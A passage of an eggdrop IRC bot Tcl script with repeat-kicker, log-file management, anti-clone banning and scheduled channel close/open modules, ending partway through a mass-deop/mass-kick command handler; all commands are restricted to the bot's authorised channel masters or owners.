		pb $idx "Specify a numerical value ( reps\# ) to change.."
	    } else {
		if {![matchattr $h m]} {
		    pb $idx "Sorry, only global masters can change that.."
		    return 0
		}
		set rep_allow [expr $param2]
		rep_save
		bl "Repeat-Kicker now allows $rep_allow repetitions in $rep_time seconds : Authorized by $h."
	    }
	}
	"time" {
	    if {$param2 == "" || [string trim $param2 "0123456789"] != ""} {
		pb $idx "Currently allowing $rep_allow repetitions in $rep_time seconds."
		pb $idx "Specify a numerical vaule ( seconds\# ) to change.."
	    } else {
		if {![matchattr $h m]} {
		    pb $idx "Sorry, only global masters can change that.."
		    return 0
		}
		set rep_time [expr $param2]
		rep_save
		bl "Repeat-Kicker now allows $rep_allow repetitions in $rep_time seconds : Authorized by $h."
	    }
	}
	"ban" {
	    if {($param2 == "") || (($param2 != "yes") && ($param2 != "no") && ([string trim $param2 "0123456789"] != ""))} {
		if {$rep_ban == "yes" || $rep_ban == "no"} {
		    pb $idx "Should I ban transgressors ? --> $rep_ban."
		} else {
		    pb $idx "Should I ban transgressors ? --> after $rep_ban kicks."
		}
		pb $idx "Specify 'yes',  'no' or '\#kicks' to change.."
	    } else {
		if {![matchattr $h m]} {
		    pb $idx "Sorry, only global masters can change that.."
		    return 0
		}
		set rep_ban $param2
		rep_save
		bl "Repeat-Kicker ban for transgressors set to : $rep_ban : Authorized by $h."
	    }
	}
	"bantime" {
	    if {$param2 == "" || [string trim $param2 "0123456789"] != ""} {
		if {$rep_bantime == 0} {
		    pb $idx "Current bantime is 0 ( perm-ban )."
		} else {
		    pb $idx "Current bantime is $rep_bantime min."
		}
		pb $idx "Specify a numerical vaule ( minutes\# ) to change.. ( 0 for perm-ban )."
	    } else {
		if {![matchattr $h m]} {
		    pb $idx "Sorry, only global masters can change that.."
		    return 0
		}
		set rep_bantime [expr $param2]
		rep_save
		if {$rep_bantime == 0} {
		    bl "Repeat-Kicker bantime set to '0' ( perm-ban ) : Authorized by $h."
		} else {
		    bl "Repeat-Kicker bantime set to $rep_bantime minutes : Authorized by $h."
		}
	    }
	}
	"msg" {
	    set newmsg [lrange $arg 1 end]
	    if {$newmsg == ""} {
		pb $idx "Repeat-Kicker message is : $rep_msg"
		pb $idx "Specify a new message to change.."
	    } else {
		set rep_msg $newmsg
		rep_save
		pb $idx "Repeat-Kicker message set to :"
		pb $idx "$rep_msg"
	    }
	}
	default {
	    pb $idx "Repeat-Kicker : I can't recognize $param1.. :("
	    pb $idx "Try .help repeat to know more ! ;)"
	}
    }
}

al init "Repeat-Kicker System loaded and ready!"
set rep_module_loaded 1
}
set smart_logs {# Advanced Log System

global wpref bnick logs_module_loaded

bind dcc m|m logs dcc:logs

set logs_module_conf "$wpref.logs"

proc log_save {} {
    global logs_module_conf max-logs max-logsize log-time
    set fileid [open $logs_module_conf w]
    puts $fileid "set max-logs ${max-logs}"
    puts $fileid "set max-logsize ${max-logsize}"
    puts $fileid "set log-time ${log-time}"
    foreach l [logfile] {
	puts $fileid "logfile [lrange $l 0 2]"
    }
    close $fileid
}

if {![file exist $logs_module_conf]} {
    log_save
} else {
    foreach l [logfile] {
	logfile "" [lindex $l 1] [lindex $l 2]
    }
}

source $logs_module_conf

proc dcc:logs {h i a} {
    global botnick max-logs max-logsize log-time logs_module_conf nick1
    set pa($i) "logs"
    set log [strl [bi $a 0]]
    set unklogs ""
    set unk_l [glob -nocomplain -- *log*]
    foreach u $unk_l {
	if {($u != "logs") && ($u != $logs_module_conf)} {
	    lappend unklogs $u
	}
    }
    set unk_l [glob -nocomplain -- logs/*]
    foreach u $unk_l {
	lappend unklogs $u
    }
    unset unk_l
    set actlogs [logfile]
    if {$log == ""} {
	putcmdlog "\#$h\# logs [lrange $a 0 end]"
	pb $i "----= Log System Status =----"
	pb $i "[b]*[b] Max logs number\t: ${max-logs}"
	pb $i "[b]*[b] Max logfiles size\t: ${max-logsize}"
	pb $i "[b]*[b] Logs timestamp\t: ${log-time}"
	pb $i "-----------------------------"
	if {$actlogs != ""} {
	    pb $i "---= Logging enabled for =---"
	    foreach l $actlogs {
		pb $i "[b]*[b] [lindex $l 2] ( [lindex $l 1] ) : [lindex $l 0]"
	    }
	    pb $i "-----------------------------"
	}
	pb $i "Try '.help logs' to know more ! ;)"
	return 0
    }
    set logfiles ""
    foreach l $actlogs {
	lappend logfiles [lindex $l 2]
    }
    set ul ""
    foreach l $unklogs {
	if {![string match "*$l*" $logfiles]} {
	    lappend logfiles $l
	    lappend ul $l
	}
    }
    set unklogs $ul
    unset ul
    switch -exact -- $log {
	"get" {
	    set logname [strl [lindex $a 1]]
	    if {$logname == ""} {
		pb $i "Usage : '.logs get all \[yournick\]' or"
		pb $i "'.logs get <logfilename> \[yournick\]'"
		pb $i "Try '.logs list' to have a list of valid logfiles.."
		return 0
	    }
	    set nick [bi $a 2]
	    if {$nick == ""} {
		set nick $h
	    }
	    if {$logname == "all"} {
		if {![matchattr $h m]} {
		    pb $i "Sorry, only global masters can get all logs.."
		    return 0
		}
		putcmdlog "\#$h\# logs [lrange $a 0 end]"
		foreach l $logfiles {
		    set act "no"
		    foreach a $actlogs {
			if {$l == [lindex $a 2]} {
			    set act "yes"
			    logfile "" [lindex $a 1] [lindex $a 2]
			    dccsend $l $nick
			    logfile [lindex $a 0] [lindex $a 1] [lindex $a 2]
			}
		    }
		    if {$act == "no"} {
			dccsend $l $nick
		    }
		}
		unset act
		bl "Sending ALL log-files to $h ( $nick on IRC )"
	    } else {
		set ok "no"
		foreach l $logfiles {
		    if {[strl $l] == $logname} {
			set ok "yes"
			set logname $l
		    }
		}
		if { $ok == "yes" } {
		    if {![matchattr $h m]} {
			set locale_ok "no"
			foreach l $actlogs {
			    if {[strl [lindex $l 2]] == $logname} {
				if {[matchattr $h |m [lindex $l 1]]} {
				    set locale_ok "yes"
				}
			    }
			}
			if {$locale_ok == "no"} {
			    regsub ".yesterday" $logname "" logname
			    foreach l $actlogs {
				if {[strl [lindex $l 2]] == $logname} {
				    if {[matchattr $h |m [lindex $l 1]]} {
					set locale_ok "yes"
					set logname "$logname.yesterday"
				    }
				}
			    }
			}
			if {$locale_ok == "no"} {
			    set botmainlog "[strl $nick1].log"
			    if {$logname == $botmainlog} {
				set locale_ok "yes"
			    }
			}
		    } else {
			set locale_ok "yes"
		    }
		    if {$locale_ok == "no"} {
			pb $i "Sorry, you don 't have master privileges for channel logged in $logname.."
			return 0
		    }

		    putcmdlog "\#$h\# logs [lrange $a 0 end]"
		    set act "no"
		    foreach a $actlogs {
			if {$logname == [lindex $a 2]} {
			    set act "yes"
			    logfile "" [lindex $a 1] [lindex $a 2]
			    dccsend $logname $nick
			    logfile [lindex $a 0] [lindex $a 1] [lindex $a 2]
			}
		    }
		    if {$act == "no"} {
			dccsend $logname $nick
		    }
		    unset act
		} else {
		    pb $i "I can't find $logname in my log files.. :("
		    pb $i "Try '[b].logs list[b]' to have a list of available logs.."
		}
		bl "Sending log-file $logname to $h ( $nick on IRC )"
	    }
	}
	"list" {
	    putcmdlog "\#$h\# logs [lrange $a 0 end]"
	    if { $actlogs == "" && $unklogs == ""} {
		pb $i "Sorry, no log files found .. :("
		return 0
	    }
	    if { $actlogs != "" } {
		pb $i "---=> Available active log files <=---"
		foreach l $actlogs {
		    pb $i "[b]*[b] [lindex $l 2] ( [lindex $l 1] ) : [lindex $l 0]"
		}
	    }
	    if { $unklogs != ""} {
		pb $i "---=> Available unknow log files <=---"
		foreach l $unklogs {
		    pb $i "[b]*[b] $l"
		}
	    }
	    pb $i "--------------------------------------"
	}
	"add" {
	    if {![matchattr $h n]} {
		pb $i "Sorry, only global owners can add logfiles.."
		return 0
	    }
	    set chan [bi $a 1]
	    set flags [bi $a 2]
	    set lname [bi $a 3]
	    if {$flags == ""} {
		pb $i "Usage : .logs add <\#channel> <flags> \[log-filename\]"
		return 0
	    }
	    if {$chan != "*" && ![validchan $chan]} {
		pb $i "Sorry, I don't monitor $chan.."
		return 0
	    }
	    putcmdlog "\#$h\# logs [lrange $a 0 end]"
	    if {$lname == ""} {
		if {$chan == "*"} {
		    set lname "[strl $botnick].log"
		} else {
		    set lname "[strl $chan].log"
		    regsub -all "\#" $lname "" lname
		}
	    }
	    logfile $flags $chan $lname
	    log_save
	    bl "Created log-file $lname for channel $chan ( $flags ) : Authorized by $h."
	}
	"stop" {
	    if {![matchattr $h n]} {
		pb $i "Sorry, only global owners can stop logging.."
		return 0
	    }
	    set lname [strl [bi $a 1]]
	    if {$lname == ""} {
		pb $i "Usage : .logs stop <log-filename> or ALL"
		pb $i "Try '[b].logs list[b]' to have a list of available log-files."
		return 0
	    }
	    if {$lname == "all"} {
		putcmdlog "\#$h\# logs stop all"
		foreach sl $actlogs {
		    logfile "" [lindex $sl 1] [lindex $sl 2]
		}
		bl "Stopped logging [b]all[b] : Authorized by $h."
		return 0
	    }
	    set ok "no"
	    foreach l $actlogs {
		if {[strl [lindex $l 2]] == $lname} {
		    set lname [lindex $l 2]
		    set lchan [lindex $l 1]
		    set flags [lindex $l 0]
		    set ok "ok"
		}
	    }
	    if { $ok == "no" } {
		pb $i "Sorry, $lname is not an active log-file.."
		return 0
	    }
	    putcmdlog "\#$h\# logs [lrange $a 0 end]"
	    logfile "" $lchan $lname
	    log_save
	    bl "Stopped logging $lchan ( $flags ) : Authorized by $h."
	}
	"max" {
	    if {![matchattr $h n]} {
		pb $i "Sorry, only global owners can set that.."
		return 0
	    }
	    set max [bi $a 1]
	    if {$max == ""} {
		pb $i "Usage : .logs max <max-logs>"
		return 0
	    }
	    if {[string trim $max "0123456789"] != "" || $max < 5} {
		pb $i "You must specify a numeric value >= 5.."
		return 0
	    }
	    putcmdlog "\#$h\# logs [lrange $a 0 end]"
	    set max-logs $max
	    log_save
	    bl "Max logs number set to $max : Authorized by $h."
	}
	"size" {
	    if {![matchattr $h n]} {
		pb $i "Sorry, only global owners can set that.."
		return 0
	    }
	    set size [bi $a 1]
	    if {$size == ""} {
		pb $i "Usage : .logs size <max-size>"
		return 0
	    }
	    if {[string trim $size "0123456789"] != ""} {
		pb $i "You must specify a numeric value ( in kilobytes ).."
		return 0
	    }
	    putcmdlog "\#$h\# logs [lrange $a 0 end]"
	    set max-logsize $size
	    log_save
	    bl "Max logfiles size set to $size : Authorized by $h."
	}
	"timestamp" {
	    if {![matchattr $h n]} {
		pb $i "Sorry, only global owners can set that.."
		return 0
	    }
	    if {[bi $a 1] == ""} {
		pb $i "Usage : .logs timestamp 1 / 0"
		return 0
	    }
	    set tstamp [bi $a 1]
	    if {[string trim $size "01"] != ""} {
		pb $i "You must specify 0 or 1.."
		return 0
	    }
	    putcmdlog "\#$h\# logs [lrange $a 0 end]"
	    set log-time $tstamp
	    log_save
	    bl "Logfiles timestamping set to $tstamp : Authorized by $h."
	}
	default {
	    pb $i "Usage : .logs"
	    pb $i "        .logs list"
	    pb $i "        .logs get all"
	    pb $i "        .logs get <log-filename>"
	    pb $i "        .logs add <\#channel / *> <flags> \[log-filename\]"
	    pb $i "        .logs stop <log-filename>"
	    pb $i "        .logs max <max-logs>"
	    pb $i "        .logs size <max-filesize>"
	    pb $i "        .logs timestamp 0 / 1"
	    pb $i "Try '[b].help logs[b]' to know more ! ;)"
	}
    }
}
al init "Log System loaded and ready!"
set logs_module_loaded 1
}
set smart_clone {# Anti Clone System

global wpref clone_module_loaded clone_module_conf clone_ver clone_ver1 clone_max clone_bt clone_ex clone_msg clones

bind dcc m|m clone dcc:clone

set clone_module_conf "$wpref.clone"
set clone_ver ""
set clone_ver1 "1.1"
set clone_max(all) "off"
set clone_bt 10
set clone_ex "o|o"
set clone_msg "No more than %max clones allowed!"

proc clone_save {} {
    global clone_module_conf clone_ver clone_max clone_bt clone_ex clone_msg
    set fd [open $clone_module_conf w]
    puts $fd "set clone_ver \"$clone_ver\""
    foreach i [array names clone_max] {
	puts $fd "set clone_max($i) \"$clone_max($i)\""
    }
    puts $fd "set clone_bt $clone_bt"
    puts $fd "set clone_ex \"$clone_ex\""
    puts $fd "set clone_msg \"$clone_msg\""
    close $fd
}

if {![file exists $clone_module_conf]} {
    al init "Anti-Clone System conf file not found..Generating defaults.."
    clone_save
}

source $clone_module_conf

if {$clone_ver1 != $clone_ver} {
    set clone_ver $clone_ver1
    clone_save
}

unset clone_ver1

proc clone_join {n uh h c} {
    clone_check $c $n
}

proc clone_check {{chan ""} {nick ""}} {
    global clone_max clone_ex clone_bt clone_msg clones
    if {$chan == ""} {
	foreach t [timers] {
	    if {[string match *clone_check* [lindex $t 1]]} {
		killtimer [lindex $t 2]
	    }
	}
	set q [strl [channels]]
    } else {
	set q [strl $chan]
    }
    foreach c $q {
	if {(![info exists clone_max($c)] && $clone_max(all) == "off") || ([info exists clone_max($c)] && $clone_max($c) == "off") || ![botonchan $c] || ![botisop $c]} { continue }
	if {[info exists clone_max($c)]} {
	    set k $c
	} else {
	    set k "all"
	}
	if {![clone_scan $c $clone_max($k) $nick]} { continue }
	foreach i [array names clones] {
	    set ok 1
	    set h [string range $i 0 [expr [string first @ $i] - 1]]
	    set ch [string range $i [expr [string first @ $i] + 1] end]
	    if {$ch == $c} {
		foreach n $clones($i) {
		    set o [nick2hand $n $c]
		    if {[isbotnick $n] || [matchattr $o b] || [matchattr $o $clone_ex $c]} {
			set ok 0
			break
		    }
		}
		if {$ok} {
		    regsub -all " " $clones($i) "," p
		    regsub -all "%max" $clone_msg $clone_max($k) m
		    bl "Banning [b][llength $clones($i)] clones[b] from $c ( host $h ) : [b]$clones($i)[b]"
		    newchanban $c *!*@$h "Clone Scanner" "[llength $clones($i)] clones found" $clone_bt
		    putkick $c $p $m
		}
	    }
	}
    }
    if {$chan == ""} {
	timer 5 clone_check
    }
}

proc clone_scan {c min {nick ""}} {
    global clones
    set c [strl $c]
    foreach i [array names clones] {
	set ch [string range $i [expr [string first @ $i] + 1] end]
	if {$ch == $c} { unset clones($i) }
    }
    if {$nick == ""} { set nick [join [chanlist $c]] }
    foreach n [split $nick] {
	set x [getchanhost $n $c];
	#set z [lindex [split $x @] 0]; set z [lindex [split $z !] 1]
	set x [string range $x [expr [string first @ $x] + 1] end]
	if {![info exists clones($x@$c)]} {
	    set clones($x@$c) $n
	} else {
	    if {[lsearch -exact $clones($x@$c) $n] == -1} {
		lappend clones($x@$c) $n
	    }
	}
	foreach u [chanlist $c] {
	    if {$u == $n} { continue }
	    set y [getchanhost $u $c]
	    set y [string range $y [expr [string first @ $y] + 1] end]
	    if {$y == $x} {
		if {[lsearch -exact $clones($x@$c) $u] == -1} {
		    lappend clones($x@$c) $u
		}
	    }
	}
    }
    set l 0
    foreach i [array names clones] {
	if {[llength [split $clones($i)]] <= $min} {
	    unset clones($i)
	} else {
	    set ch [string range $i [expr [string first @ $i] + 1] end]
	    if {$ch == $c} {
		incr l
	    }
	}
    }
    if {$l > 0} { return 1 } else { return 0 }
}

proc clone {} {
    global clone_max
    foreach i [array names clone_max] {
	if {$clone_max($i) != "off"} {
	    return 1
	}
    }
    return 0
}

proc clone_start {} {
    set b [lindex [binds clone_join] 0]
    if {$b == ""} {
	catch {bind join - * clone_join}
    }
    utimer 5 clone_check
}

proc clone_stop {} {
    set b [lindex [binds clone_join] 0]
    if {$b != ""} {
	catch {unbind join - * clone_join}
    }
    foreach t [timers] {
	if {[lindex $t 1] == "clone_check"} {
	    killtimer [lindex $t 2]
	}
    }
}

if {[clone]} {
    clone_start
} else {
    clone_stop
}

proc clone_show {i ch} {
    global clones
    set ch [strl $ch]
    pb $i "Clones found for channel [b]$ch[b] :"
    foreach u [array names clones] {
	set h [string range $u 0 [expr [string first @ $u] - 1]]
	set c [string range $u [expr [string first @ $u] + 1] end]
	if {$c == $ch} {
	    pb $i "[b][llength $clones($u)][b] hosts $h : [join $clones($u)]"
	}
    }
    pb $i "-----------------------------------"
}

proc dcc:clone {h i a} {
    global clone_ver clone_max clone_bt clone_ex clone_msg
    set c [strl [bi $a 0]]
    set p [strl [bi $a 1]]
    if {$c == ""} {
	putcmdlog "\#$h\# clone"
	pb $i "--=> Anti Clone System Status <=--"
	pb $i "----------------------------------"
	pb $i "System Version \t: [b]$clone_ver[b]"
	pb $i "Max connections\t: all --> [b]$clone_max(all)[b]"
	foreach j [array names clone_max] {
	    if {$j != "all"} {
		pb $i "Allowed clones \t: $j --> [b]$clone_max($j)[b]"
	    }
	}
	pb $i "Clones bantime \t: [b]$clone_bt[b]"
	pb $i "Exempted flags \t: [b]$clone_ex[b]"
	pb $i "Punish message \t: [b]$clone_msg[b]"
	pb $i "----------------------------------"
	pb $i "Try '[b].help clone[b]' for command list and more.."
	return 0
    }
    switch -exact -- $c {
	"help" {
	    dccsimul $i ".help clone"
	}
	"clear" {
	    if {![matchattr $h n]} {
		pb $i "Sorry, only global owners can do that!"
		return 0
	    }
	    dcc:clear $h $i "clone"
	}
	"ver" {
	    putcmdlog "\#$h\# clone $c"
	    pb $i "Anti Clone System Version is : [b]$clone_ver[b]"
	}
	"max" {
	    set ch $p
	    set p [strl [bi $a 2]]
	    if {$ch == "" || $p == "" && ($ch == "all" || ![info exists clone_max($ch)])} {
		set k "all"
		putcmdlog "\#$h\# clone $c $ch"
		pb $i "Allowed clones ( for $k ) : [b]$clone_max($k)[b]"
		return 0
	    }
	    if {$ch != "all" && ![validchan $ch]} {
		pb $i "Usage : .clone max <[b]\#channel[b] or [b]all[b]> \[max-clones\# or off\]"
		pb $i "[b]$ch[b] is not a valid channel.."
		return 0
	    }
	    if {$p != "off" && $p != "all" && ([string trim $p "0123456789"] != "" || [expr $p] < 1)} {
		pb $i "Usage : .clone max <\#channel or all> \[[b]max-clones\#[b] or [b]all[b] or [b]off[b]\]"
		pb $i "[b]$p[b] is not a valid number >= 1.. ( and is not 'off' or 'all')"
		return 0
	    }
	    if {[info exists clone_max($ch)] && $p == $clone_max($ch)} {
		pb $i "Max allowed clones for [b]$ch[b] is already '$p' ! ;)"
		return 0
	    }
	    if {$p == "all" && [info exists clone_max($ch)]} {
		if {$p == $ch} {
		    if {![matchattr $h m]} {
			pb $i "Sorry, only global masters can do that!"
			return 0
		    }
		    putcmdlog "\#$h\# clone $c $ch $p"
		    foreach j [array names clone_max] {
			if {$j != "all"} {
			    unset clone_max($j)
			}
		    }
		} else {
		    if {![matchattr $h m|m $ch]} {
			pb $i "Sorry, only $ch's masters can do that!"
			return 0
		    }
		    putcmdlog "\#$h\# clone $c $ch $p"
		    unset clone_max($ch)
		}
	    } else {
		if {$p != "all"} {
		    if {$ch != "all" && ![matchattr $h m|m $ch]} {
			pb $i "Sorry, only $ch's masters can do that!"
			return 0
		    } elseif {$ch == "all" && ![matchattr $h m]} {
			pb $i "Sorry, only global masters can do that!"
			return 0
		    }
		    putcmdlog "\#$h\# clone $c $ch $p"
		    set clone_max($ch) $p
		}
	    }
	    clone_save
	    if {[clone]} {
		clone_start
	    } else {
		clone_stop
	    }
	    bl "Max allowed clones for [b]$ch[b] set to : [b]$p[b] : requested by $h."
	}
	"bantime" {
	    if {$p == ""} {
		putcmdlog "\#$h\# clone $c"
		pb $i "Bantime for clones is : [b]$clone_bt[b] minutes"
		return 0
	    }
	    if {![matchattr $h m]} {
		pb $i "Sorry, only global masters can change that!"
		return 0
	    }
	    if {[string trim $p "0123456789"] != "" || [expr $p] < 5 || [expr $p] > 30} {
		pb $i "Please, enter a numerical value in the range 5 - 30 minutes.."
		return 0
	    }
	    if {$clone_bt == $p} {
		pb $i "Bantime for clones is already $p minutes ! ;)"
		return 0
	    }
	    putcmdlog "\#$h\# clone $c $p"
	    set clone_bt $p
	    clone_save
	    bl "Bantime for clones set to [b]$clone_bt[b] minutes : requested by $h."
	}
	"exempt" {
	    set p [bi $a 1]
	    if {$p == ""} {
		putcmdlog "\#$h\# clone $c"
		pb $i "Exempted flags from clone scanning are : [b]$clone_ex[b]"
		return 0
	    }
	    if {![matchattr $h n]} {
		pb $i "Sorry, only global owners can change that!"
		return 0
	    }
	    if {([string length $p] != 1 && [string length $p] != 3) || ([string length $p] == 3 && [string index $p 1] != "|")} {
		pb $i "Please use the notation '[b]x[b]' or '[b]x|y[b]'.."
		return 0
	    }
	    putcmdlog "\#$h\# clone $c $p"
	    set clone_ex $p
	    clone_save
	    bl "Exempted flags from clone scanning set to : '[b]$p[b]' : Authorized bt $h."
	}
	"scan" {
	    if {$p == ""} {
		set p "all"
	    }
	    if {$p != "all"} {
		if {![validchan $p]} {
		    pb $i "Sorry, I don 't monitor '[b]$p[b]'.."
		    return 0
		}
		if {![botonchan $p]} {
		    pb $i "Sorry, I 'm not on '[b]$p[b]' at the moment..Retry later please!"
		    return 0
		}
		if {![matchattr $h m|m $p]} {
		    pb $i "Sorry, only $p 's masters can do that!"
		    return 0
		}
		putcmdlog "\#$h\# clone $c $p"
		if {![clone_scan $p 1]} {
		    pb $i "No clones found on [b]$p[b] ! ^_^"
		} else {
		    clone_show $i $p
		}
		return 0
	    }
	    putcmdlog "\#$h\# clone $c"
	    if {![matchattr $h m]} {
		pb $i "Sorry, only global masters can do that!"
	    }
	    foreach ch [channels] {
		if {![clone_scan $ch 1]} {
		    pb $i "No clones found on [b]$ch[b] ! ^_^"
		    pb $i "-----------------------------------"
		} else {
		    clone_show $i $ch
		}
	    }
	}
	"msg" {
	    if {$p == ""} {
		putcmdlog "\#$h\# clone $c"
		pb $i "Punish kick-message for clones is : [b]$clone_msg[b]"
		return 0
	    }
	    if {![matchattr $h m]} {
		pb $i "Sorry, only global masters can change that!"
		return 0
	    }
	    putcmdlog "\#$h\# clone $c \[...\]"
	    set clone_msg [lrange $a 1 end]
	    bl "Punish kick-message for clones set to : '[b]$clone_msg[b]' : requested by $h."
	}
	default {
	    pb $i "Unrecognized option.. Try '[b].help clone[b]' for command list and more.."
	    return 0
	}
    }
}
al init "Anti-Clone System loaded and ready!"
set clone_module_loaded 1
}
set smart_take {# TakeOver System

global wpref bnick take_module_loaded Takeover deopnicks mass cmx_b take_module_conf close_c close_module_conf

bind dcc - date dcc:date
bind dcc m|m mdeop dcc:cmx
bind dcc m|m mkick dcc:cmx
bind dcc m|m close dcc:cmx
bind dcc m|m open dcc:open
bind dcc m|m aclose dcc:aclose
bind bot - cmx_get bot:cmx_get
bind bot - cmx_put bot:cmx_put
bind bot - cmx_take bot:cmx_take

proc dcc:date {h i a} { putcmdlog "\#$h\# date" ; pb $i "Current date is : [b][ctime [unixtime]][b]" }

proc chan:open {c h {w 0}} {
    global global-chanmode
    if {![validchan $c] || ![botonchan $c] || ![botisop $c]} { return 0 }
    if {![info exists global-chanmode]} { set m "stn" } else { set m ${global-chanmode} }
    channel set $c chanmode $m
    set m [getchanmode $c] ; if {[string match *k* [bi $m 0]]} { set k [bi $m 1] } else { set k "" }
    pushmode $c -m ; pushmode $c -i ; pushmode $c -k $k ; flushmode $c
    if {$w} {
	set m "scheduled by Auto Channel-Close System ( requested by $h )"
    } else { set m "requested by $h" }
    bl "Opening channel $c : $m." ; putquick "NOTICE $c :[boja] - Channel Opened, say 'Thanks $h' ! ;)"
}

proc chan:close {c h t} {
    global cmx_b
    if {![validchan $c]} { return 0 }
    if {![botonchan $c] || ![botisop $c]} {
	bl "Problems closing $c.. I'll retry in 10 minutes.." ; return 0
    }
    set m [getchanmode $c] ; if {[string match *i* [bi $m 0]] && [string match *m* [bi $m 0]]} { return 0 }
    bl "Auto Channel-Close System will close channel $c ( requested by $h ) - start in 20 seconds.."
    putquick "NOTICE $c :Channel will be closed in 20 seconds : see you at [b]$t[b] !"
    set cmx_b($c) "" ; putallbots "cmx_get $c $c"
    utimer 20 "cmx_do [p_test $h] $c $c close 20 do"
}

proc dcc:open {h i a} {
    set c [strl [bi $a 0]]
    if {$c == ""} { pb $i "Usage : .open <\#channel>" ; return 0 }
    if {![validchan $c] || ![botonchan $c] || ![botisop $c]} {
	pb $i "Sorry, I can 't open '$c', please do a '.check' or '.status' .." ; return 0
    }
    putcmdlog "\#$h\# open $c"
    chan:open $c $h
}

set close_module_conf "$wpref.close"
set close_c(all) "off"
proc close_save {} {
    global close_module_conf close_c
    set fd [file_try $close_module_conf w]
    if {$fd == 0} { bl "Could not write file $close_module_conf.." ; return 0 }
    foreach c [array names close_c] { puts $fd "set close_c($c) \"$close_c($c)\"" } ; close $fd
}
if {![file exists $close_module_conf]} { close_save }
source $close_module_conf
bind time - "* * * * *" smart:time
proc smart:time {m h d n y} {
    global close_c
    foreach c [strl [channels]] {
	if {![info exists close_c($c)] && $close_c(all) == "off"} { continue }
	if {[info exists close_c($c)]} { set C $c } else { set C "all" }
	set b [split [bi $close_c($C) 0] :] ; if {$b == "off"} { continue }
	set e [split [bi $close_c($C) 1] :] ; set H [bi $close_c($C) 2]
	set bh [bi $b 0] ; set bm [bi $b 1] ; set eh [bi $e 0] ; set em [bi $e 1]
	if {$h == $bh && $m == $bm} {
	    chan:close $c $H "$eh:$em"
	} elseif {$h == $eh && $m == $em} { chan:open $c $H 1 }
    }
}
proc aclose:check {} {
    global close_c
    set ct [split [lindex [ctime [unixtime]] 3] :] ; set h [bi $ct 0] ; set m [bi $ct 1]
    foreach c [strl [channels]] {
	if {![info exists close_c($c)] && $close_c(all) == "off"} { continue }
	if {[info exists close_c($c)]} { set C $c } else { set C "all" }
	set b [split [bi $close_c($C) 0] :] ; if {$b == "off"} { continue }
	set e [split [bi $close_c($C) 1] :] ; set H [bi $close_c($C) 2]
	set bh [bi $b 0] ; set bm [bi $b 1] ; set eh [bi $e 0] ; set em [bi $e 1]
	if {(($h > $bh) || ($h == $bh && $m >= $bm)) && (($h < $eh) || ($h == $eh && $m < $em))} {
	    chan:close $c $H "$eh:$em"
	} else { chan:open $c $H 1 }
    }
    if {![string match *aclose:check* [timers]]} { timer 10 aclose:check }
}
if {![string match *aclose:check* [timers]]} { timer 10 aclose:check }
proc dcc:aclose {h i a} {
    global close_module_conf close_c
    set c [strl [bi $a 0]] ; set b [strl [bi $a 1]]
    set e [strl [bi $a 2]] ; set t [lindex [ctime [unixtime]] 3]
    set t [string range $t 0 [expr [string last : $t] - 1]]
    if {$c == ""} {
	putcmdlog "\#$h\# aclose"
	pb $i "---> Auto Channel-Close System <---"
	foreach j [array names close_c] {
	    if {[bi $close_c($j) 0] == "off"} { set q "[b]never[b]" } else {
		set q "from [b][bi $close_c($j) 0][b] to [b][bi $close_c($j) 1][b]"
	    }
	    pb $i "$j \t : $q"
	}
	pb $i "-----------------------------------"
	pb $i "Use '.aclose <\#channel> <hh\[:mm\]> <hh\[:mm\]>' to change.."
	pb $i "Current bot time is [b]$t[b]"
	return 0
    }
    if {$b == ""} {
	if {[info exists close_c($c)] || [validchan $c]} {
	    putcmdlog "\#$h\# aclose $c"
	    if {[info exists close_c($c)]} { set C $c } else { set C "all" }
	    if {[bi $close_c($C) 0] == "off"} { set q "[b]never[b]" } else {
		set q "from [b][bi $close_c($C) 0][b] to [b][bi $close_c($C) 1][b]"
	    }
	    if {$C != $c} { append q " ( using 'all' setting .. )" }
	    pb $i "I will automatically close [b]$c[b] : $q"
	    pb $i "Use '.aclose $c <hh\[:mm\]> <hh\[:mm\]>' to change.."
	    pb $i "Current bot time is [b]$t[b]"
	    return 0
	}
	pb $i "Sorry, I don 't monitor channel '$c' .. Try '.status' ! :)"
	return 0
    }
    if {$c != "all"} {
	if {![validchan $c]} { pb $i "Sorry, I don 't monitor channel '$c'.." ; return 0 }
	if {![matchattr $h m|m $c]} { pb $i "Sorry, only $c 's masters can do that.." ; return 0 }
    }
    if {$c == "all" && ![matchattr $h m]} { pb $i "Sorry, only global masters can change that.." ; return 0 }
    if {$b == "all"} {
	putcmdlog "\#$h\# aclose $c $b"
	if {$c == "all"} { foreach j [array names close_c] { if {$j != "all"} { unset close_c($j) } } } else {
	    if {[info exists close_c($c)]} { unset close_c($c) }
	}
	close_save ; bl "Auto Channel-Close for '$c' set to '$b' : requested by $h." ; return 0
    }
    if {$b == "off"} {
	set close_c($c) $b ; close_save
	bl "Auto Channel-Close for '$c' set to '$b' : requested by $h." ; return 0
    }
    if {$e == ""} {
	pb $i "You must also specify an hour to reopen chan! :) If you want to permanently close it, use '.close $c' !"
	return 0
    }
    set b [split $b :] ; set e [split $e :]
    foreach n "$b $e" {
	if {[string trim $n "0123456789"] != ""} {
	    pb $i "Please, use standard time format.. For example, current bot time is [b]$t[b] ! ^_^"; return 0
	}
    }
    if {[llength $b] > 1} { set b "[bi $b 0]:[bi $b 1]" } else { set b "[bi $b 0]:00" }
    if {[llength $e] > 1} { set e "[bi $e 0]:[bi $e 1]" } else { set e "[bi $e 0]:00" }
    if {$e == $b} { pb $i "If you want to permanently close $c, use '.close $c' !" ; return 0 }
    putcmdlog "\#$h\# aclose $c $b $e" ; set close_c($c) "$b $e $h" ; close_save
    bl "Auto Channel-Close System enabled for [b]$c[b] from $b to $e : requested by $h."
}

proc dcc:cmx {h i a} {
    global lastbind cmx_b
    set l [strl $lastbind] ; set c [strl [bi $a 0]] ; set t [strl [bi $a 1]]
    set s [strl [bi $a 2]] ; set w [string range $l 1 end] ; if {$w == "lose"} { set w "close" }
    if {$c == ""} { pb $i "Usage : .$l <\#channel> \[max-bot-ping\] \[do\]" ; return 0 }
    if {![validchan $c] || ![botonchan $c]} { pb $i "Sorry, I 'm not on $c.." ; return 0 }
    if {![matchattr $h m|m $c]} { pb $i "Sorry, only $c 's masters can do that.." ; return 0 }
    if {![botisop $c]} { pb $i "I need ops on $c.. Try '.avop op' first !" ; return 0 }
    if {$t == "" || [string trim $t "0123456789"] != ""} {
	if {$t == "do"} { set s $t } else { set t "" }
	if {$w == "close"} { set T 5 } else { set T 3 }
    } else { set T $t }
    set q "$l $c $t " ; if {$s != "do"} { set s "" } ; if {$t != "do"} { append q $s } ; putcmdlog "\#$h\# $q"
